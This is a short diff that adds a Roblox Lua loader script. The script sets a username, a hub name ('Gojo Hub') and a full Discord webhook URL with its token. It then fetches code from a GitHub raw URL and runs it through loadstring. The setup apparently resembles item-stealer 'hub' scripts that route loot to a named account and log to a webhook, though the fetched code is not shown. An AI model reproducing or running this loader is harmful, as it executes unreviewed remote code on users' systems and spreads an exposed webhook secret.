@@ -1,0 +1,7 @@
+_G.Username = "linhchannel893"
+ 
+_G.HubName = "Gojo Hub"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1108683401642393670/sLMORw2Mun-WWFURoSgc5E68pCrGYJk_DxCjT6zhEXiiRa3LMS5gTYYdI3gVDxGnjpQQ"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
